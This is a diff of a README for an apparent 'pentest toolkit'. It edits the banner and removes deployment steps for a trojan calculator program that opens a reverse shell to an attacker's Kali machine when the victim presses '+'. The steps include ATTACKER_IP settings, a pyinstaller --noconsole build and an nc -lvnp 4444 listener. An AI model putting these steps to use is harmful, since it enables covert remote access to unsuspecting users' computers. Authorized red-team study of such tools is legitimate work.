@@ -1,12 +1,11 @@
-```
+██████╗ ███████╗███╗   ██╗████████╗██████╗  █████╗ ██╗  ██╗
+██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔══██╗██╔══██╗╚██╗██╔╝
+██████╔╝█████╗  ██╔██╗ ██║   ██║   ██████╔╝███████║ ╚███╔╝ 
+██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔═══╝ ██╔══██║ ██╔██╗ 
+██║     ███████╗██║ ╚████║   ██║   ██║     ██║  ██║██╔╝ ██╗
+╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝
 
-```
-██████╗  ███████╗ ███╗   ██╗████████╗██████╗  █████╗ ██╗  ██╗
-██╔══██╗ ██╔════╝ ████╗  ██║╚══██╔══╝██╔══██╗██╔══██╗╚██╗██╔╝
-██████╔╝ █████╗   ██╔██╗ ██║   ██║   ██████╔╝███████║ ╚███╔╝ 
-██╔═══╝  ██╔══╝   ██║╚██╗██║   ██║   ██╔═══╝ ██╔══██║ ██╔██╗ 
-██║      ███████╗ ██║ ╚████║   ██║   ██║     ██║  ██║██╔╝ ██╗
-╚═╝      ╚══════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝
+      FULL PENTEST TOOLKIT (V1.2.1)
 ```
 
 <p align="center">
@@ -364,41 +363,3 @@ Edit `calculator.py` and set:
 ATTACKER_IP = "YOUR_KALI_IP"  # <-- Set your Kali IP here
 ATTACKER_PORT = 4444           # <-- Set your desired port here
 ```
-
-### **2. Build the Executable (Optional)**
-```bash
-pyinstaller --onefile --noconsole calculator.py
-```
-
-### **3. Start Listener on Kali**
-```bash
-nc -lvnp 4444
-```
-
-### **4. Deploy and Trigger**
-- Run calculator on target Windows PC
-- When user presses `+`, you get shell on Kali terminal
-- Type `KILL` in shell to self-destruct calculator
-
-## 📊 **Summary Table**
-
-| Step                | Action on Attacker (Kali) Side         | Action on Victim Side         |
-|---------------------|----------------------------------------|-------------------------------|
-| 1. Start Listener   | `nc -lvnp 4444`                        |                               |
-| 2. Deploy Calculator|                                        | User runs calculator.exe      |
-| 3. Trigger Shell    |                                        | User presses `+`              |
-| 4. Get Shell        | Shell appears in Netcat terminal       |                               |
-| 5. Remote Kill      | Type `KILL` in shell, press Enter      | Calculator self-destructs     |
-
----
-
-## ⚖️ **Ethical & Legal Notice**
-- **This project is for educational and authorized security testing only.**
-- Do not use, distribute, or demonstrate this tool without explicit permission.
-- The authors are not responsible for misuse or damages.
-
----
-
-## 🏆 **Credits**
-- UI inspired by iPhone Calculator
-- Reverse shell and kill switch for red team/pentest demo scenarios 
